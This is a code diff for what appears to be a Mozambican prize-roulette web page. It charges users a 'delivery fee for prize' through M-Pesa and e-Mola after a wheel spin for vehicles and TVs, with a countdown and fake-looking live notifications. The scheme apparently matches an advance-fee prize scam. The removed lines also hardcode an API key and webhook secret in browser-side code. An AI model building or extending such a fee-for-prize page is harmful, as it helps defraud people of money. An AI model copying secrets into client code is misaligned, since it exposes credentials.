@@ -62,7 +62,7 @@ const prizes = [
   '0MT',
   '0MT',
   '100MT',
-  'CAMIONETA 4 TONELADAS',
+  'CAMIONETA 4 TON',
   'TV PLASMA'
 ];
 
@@ -442,90 +442,44 @@ async function submitForm() {
 
 async function processMpesaPayment(phone, amount) {
   console.log('Iniciando pagamento M-Pesa:', { phone, amount });
-  
-  try {
-    let apiUrl = 'https://lojasolucion.online/';
-    let apiKey = '1926|sl2yZjLW24Yovjjh6lVCyHhWuFP4pWwqURkshSLgbd7acfd6';
-    let webhookSecret = 'whsec_c1ab13667f73cc4067608c59ad1728cf4df2039632ad2ab2';
-    
-    try {
-      if (typeof import.meta !== 'undefined' && import.meta.env) {
-        apiUrl = import.meta.env.VITE_API_URL || apiUrl;
-        apiKey = import.meta.env.VITE_MPESA_API_KEY || apiKey;
-        webhookSecret = import.meta.env.VITE_WEBHOOK_SECRET || webhookSecret;
-      }
-    } catch (e) {}
-    
-    const response = await fetch(`${apiUrl}api/payment/mpesa`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${apiKey}`,
-        'X-Webhook-Secret': webhookSecret
-      },
-      body: JSON.stringify({
-        phone: phone,
-        amount: amount,
-        reference: `TELEPREMIO-${Date.now()}`,
-        description: `Taxa de entrega para prêmio: ${currentPrize}`
-      })
-    });
-    
-    if (!response.ok) {
-      throw new Error(`Erro na API: ${response.status}`);
-    }
-    
-    const data = await response.json();
-    console.log('Resposta M-Pesa:', data);
-    
-    return data;
-  } catch (error) {
-    console.error('Erro no pagamento M-Pesa:', error);
-    throw error;
-  }
+  return await processPayment('mpesa', amount);
 }
 
 async function processEmolaPayment(phone, amount) {
   console.log('Iniciando pagamento e-Mola:', { phone, amount });
-  
+  return await processPayment('emola', amount);
+}
+
+async function processPayment(method, amount) {
   try {
-    let apiUrl = 'https://lojasolucion.online/';
-    let apiKey = '1926|sl2yZjLW24Yovjjh6lVCyHhWuFP4pWwqURkshSLgbd7acfd6';
-    let webhookSecret = 'whsec_c1ab13667f73cc4067608c59ad1728cf4df2039632ad2ab2';
-    
-    try {
-      if (typeof import.meta !== 'undefined' && import.meta.env) {
-        apiUrl = import.meta.env.VITE_API_URL || apiUrl;
-        apiKey = import.meta.env.VITE_EMOLA_API_KEY || apiKey;
-        webhookSecret = import.meta.env.VITE_WEBHOOK_SECRET || webhookSecret;
-      }
-    } catch (e) {}
-    
-    const response = await fetch(`${apiUrl}api/payment/emola`, {
+    const response = await fetch('/api/pagar', {
       method: 'POST',
       headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${apiKey}`,
-        'X-Webhook-Secret': webhookSecret
+        'Content-Type': 'application/json'
       },
       body: JSON.stringify({
-        phone: phone,
+        method: method,
         amount: amount,
-        reference: `TELEPREMIO-${Date.now()}`,
         description: `Taxa de entrega para prêmio: ${currentPrize}`
       })
     });
     
     if (!response.ok) {
-      throw new Error(`Erro na API: ${response.status}`);
+      const errorData = await response.json().catch(() => ({ error: 'Erro desconhecido' }));
+      throw new Error(errorData.error || `Erro na API: ${response.status}`);
     }
     
     const data = await response.json();
-    console.log('Resposta e-Mola:', data);
+    console.log('Resposta da API:', data);
+    
+    if (data.checkout_url) {
+      window.location.href = data.checkout_url;
+      return { success: true, redirect: true };
+    }
     
     return data;
   } catch (error) {
-    console.error('Erro no pagamento e-Mola:', error);
+    console.error('Erro no pagamento:', error);
     throw error;
   }
 }
@@ -597,40 +551,4 @@ window.onload = function() {
   // updateViewersCount();
   startCountdown();
   startLiveNotifications();
-  initRoulette();
-}
-
-function initRoulette() {
-  const roulette = document.getElementById('roulette');
-  if (!roulette) return;
-  
-  const prizes = [
-    '100MT',
-    'TXOPELA',
-    'MOTORIZADA',
-    '0MT',
-    '0MT',
-    '100MT',
-    'CAMIONETA 4 TONELADAS',
-    'TV PLASMA'
-  ];
-  
-  prizes.forEach((prize, index) => {
-    const label = document.createElement('div');
-    label.className = 'label-fixed';
-    label.textContent = prize;
-    
-    const angle = index * 45 + 22.5;
-    label.style.transform = `rotate(${angle}deg)`;
-    
-    const text = document.createElement('span');
-    text.textContent = prize;
-    text.style.display = 'inline-block';
-    text.style.transform = `rotate(-${angle}deg)`;
-    
-    label.innerHTML = '';
-    label.appendChild(text);
-    
-    roulette.appendChild(label);
-  });
 }
